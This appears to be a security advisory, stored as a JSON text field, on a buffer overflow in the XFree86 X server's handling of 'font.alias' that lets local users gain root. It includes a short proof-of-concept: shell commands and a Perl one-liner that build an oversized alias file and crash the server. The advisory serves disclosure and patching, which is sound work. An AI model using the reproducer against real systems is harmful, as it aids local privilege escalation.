		"Text": "\n    <p>\n    Exploitation of a buffer overflow in The XFree86 Window System\n    discovered by iDefence allows local attackers to gain root\n    privileges.\n    </p>\n    <p>\n    The problem exists in the parsing of the 'font.alias' file. The X\n    server (running as root) fails to check the length of the user\n    provided input, so a malicious user may craft a malformed\n    'font.alias' file causing a buffer overflow upon parsing,\n    eventually leading to the execution of arbitrary code.\n    </p>\n    <p>\n    To reproduce the overflow on the command line one can run:\n    </p>\n    <code>\n    # cat &gt; fonts.dir &lt;&lt;EOF \n    1\n    word.bdf -misc-fixed-medium-r-semicondensed--13-120-75-75-c-60-iso8859-1\n    EOF\n    # perl -e 'print \"0\" x 1024 . \"A\" x 96 . \"\\n\"' &gt; fonts.alias\n    # X :0 -fp $PWD</code>\n    <p>\n    {Some output removed}... Server aborting... Segmentation fault (core dumped)\n    </p>\n  "
